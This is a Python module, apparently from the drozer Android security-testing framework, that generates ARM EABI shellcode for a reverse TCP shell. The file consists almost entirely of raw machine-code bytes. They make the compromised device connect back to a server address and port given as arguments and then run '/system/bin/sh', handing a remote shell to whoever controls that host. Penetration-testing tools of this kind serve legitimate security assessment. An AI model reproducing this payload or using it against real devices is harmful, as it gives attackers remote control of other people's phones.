from drozer.modules import common, Module

class ARMEABI(Module, common.ShellCode):

    name = "Reverse TCP Shell (ARMEABI)"
    description = """
    Shell code to establish a simple reverse TCP shell.
    """
    examples = ""
    author = "Tyrone (@mwrlabs)"
    date = "2013-06-12"
    license = "BSD (3 clause)"
    module_type = "shellcode"
    path = ["shell.reverse_tcp"]
    
    def generate(self, arguments):
        self.append([0x01, 0x10, 0x8F, 0xE2,
                     0x11, 0xFF, 0x2F, 0xE1,
                     0x02, 0x20, 0x01, 0x21,
                     0x92, 0x1a, 0x0f, 0x02,
                     0x19, 0x37, 0x01, 0xdf,
                     0x06, 0x1c, 0x08, 0xa1,
                     0x10, 0x22, 0x02, 0x37,
                     0x01, 0xdf, 0x3f, 0x27,
                     0x02, 0x21, 0x30, 0x1c,
                     0x01, 0xdf, 0x01, 0x39,
                     0xfb, 0xd5, 0x05, 0xa0,
                     0x92, 0x1a, 0x05, 0xb4,
                     0x69, 0x46, 0x0b, 0x27,
                     0x01, 0xdf, 0xc0, 0x46,
                     0x02, 0x00])
        self.append(self.hexifyInt32(int(arguments.server[1])))
        self.append(self.hexifyInetAddr(arguments.server[0]))
        self.append(self.hexifyString("/system/bin/sh"))
        self.append(self.hexifyNull())
        